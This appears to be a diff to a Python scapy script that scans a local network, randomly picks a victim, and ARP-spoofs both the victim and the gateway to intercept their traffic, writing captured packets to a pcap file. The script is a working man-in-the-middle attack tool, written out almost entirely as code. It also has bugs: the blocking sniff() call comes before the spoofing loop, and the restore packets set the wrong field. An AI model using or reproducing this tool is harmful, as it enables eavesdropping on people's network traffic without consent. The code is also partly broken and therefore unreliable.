@@ -1,14 +1,15 @@
 import os
 import re
+import time
 import socket
 import struct
-from scapy.all import *
 import random
-import time
+from scapy.all import *
+from datetime import datetime as dt
+from threading import Thread
 
 interfaces = ['en0', 'en1']
 clients = []
-original_macs = {}
 
 def get_subnet_mask(mask):
     # Convert the mask to an integer
@@ -34,8 +35,8 @@ def scan_network(gateway, subnet):
     for sent, received in result:
         clients.append({'ip': received.psrc, 'mac': received.hwsrc})
 
-def target_selection():
-    global clients, original_macs
+def attack():
+    global clients
 
     # Get the MAC address of the default gateway
     gateway_mac = next((client['mac'] for client in clients if client['ip'] == gateway_ip), None)
@@ -44,6 +45,7 @@ def target_selection():
         return
 
     print 'Gateway MAC address: {}'.format(gateway_mac)
+    print
 
     # Choose a random client to attack
     candidates = [client for client in clients if client['mac'] != gateway_mac]
@@ -53,40 +55,46 @@ def target_selection():
 
     target = random.choice(candidates)
 
+    # Start capturing
+    filename = dt.now().strftime('%Y-%m-%d-%H-%M-%S') + '.pcap'
+    sniff(filter='ip host {} or host {}'.format(gateway_ip, target['ip']), prn=lambda x: wrpcap(filename, x))
+
     print 'Target IP address: {}'.format(target['ip'])
     print 'Target MAC address: {}'.format(target['mac'])
+    print
 
     # Store the original MAC addresses
-    original_macs['gateway'] = gateway_mac
-    original_macs['target'] = target['mac']
+    original_gateway_mac = gateway_mac
+    original_target_mac = target['mac']
 
-def attack(target_mac, gateway_ip, iface):
-    print("Starting ARP spoof attack...")
+    print 'Starting ARP spoofing attack in...',
+    time.sleep(1)
+    print '3...',
+    time.sleep(1)
+    print '2...',
+    time.sleep(1)
+    print '1...'
+    print 'Press Ctrl-C to stop the attack'
+    print
+
     try:
         while True:
-            # Tell the gateway that the MAC address of the target is the MAC address of the local interface
-            send(ARP(op=2, pdst=gateway_ip, hwdst=target_mac, psrc=target_ip, hwsrc=local_mac), iface=iface, verbose=False)
+            # Send ARP reply packets to both the target and the gateway
+            # to convince them that the MAC address of the other device is at our interface
+            send(ARP(op=2, pdst=target['ip'], psrc=gateway_ip, hwdst=target['mac']))
+            send(ARP(op=2, pdst=gateway_ip, psrc=target['ip'], hwdst=gateway_mac))
 
-            # Tell the target that the MAC address of the gateway is the MAC address of the local interface
-            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=local_mac), iface=iface, verbose=False)
-
-            # Print a message to indicate that the attack is still running
-            print("Doing something...")
-
-            # Sleep for a short time to avoid overwhelming the network
-            time.sleep(1)
+            #print 'Doing something...'
+            time.sleep(5)
 
     except KeyboardInterrupt:
-        # If the user interrupts the attack, restore the original MAC addresses
-        print("Attack interrupted, restoring original MAC addresses...")
-        restore_mac_address(iface, local_mac, original_mac[iface])
-        restore_mac_address(gateway_ip, target_mac, original_mac[gateway_ip])
+        print 'Stopping the attack...'
 
-    except:
-        print("Error during ARP spoof attack, restoring original MAC addresses...")
-        restore_mac_address(iface, local_mac, original_mac[iface])
-        restore_mac_address(gateway_ip, target_mac, original_mac[gateway_ip])
-        
+        # Send ARP reply packets with the original MAC addresses to both the target and the gateway
+        for number in range(4):
+            send(ARP(op=2, pdst=target['ip'], psrc=gateway_ip, hwdst=original_target_mac))
+            send(ARP(op=2, pdst=gateway_ip, psrc=target['ip'], hwdst=original_gateway_mac))
+
 for iface in interfaces:
     # Get local IP, MAC address, and subnet mask for the current interface
     output = os.popen('ifconfig %s' % iface).read()
@@ -114,8 +122,7 @@ for iface in interfaces:
             print("\n")
 
             # Perform ARP scan to get IP and MAC addresses of devices on the network
-
             scan_network(gateway_ip, get_subnet_mask(subnet_mask))
 
-            target_selection()
+            # Perform target selection
             attack()
